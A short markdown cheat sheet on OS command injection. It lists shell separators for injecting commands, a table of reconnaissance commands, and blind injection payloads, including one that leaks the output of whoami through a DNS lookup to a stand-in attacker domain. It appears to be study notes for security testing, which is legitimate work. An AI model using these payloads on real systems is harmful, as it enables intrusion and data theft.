# OS commands
## Break
```
&
&&
|
||

# Unix-based systems
;
Newline (0x0a or \n)
` injected command `
$(injected command)
Terminar con ( " o ' ) en el payload
```
## Useful
| Purpose of command       | Linux         | Windows         |
|---------------------------|--------------|-----------------|
| Name of current user      | whoami       | whoami          |
| Operating system           | uname -a     | ver             |
| Network configuration      | ifconfig     | ipconfig /all   |
| Network connections        | netstat -an  | netstat -an     |
| Running processes          | ps -ef       | tasklist        |

# Blind OS command injection vulnerabilities
```
& ping -c 10 127.0.0.1 &
& whoami > /var/www/static/whoami.txt &
& nslookup kgji2ohoyw.web-attacker.com &
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

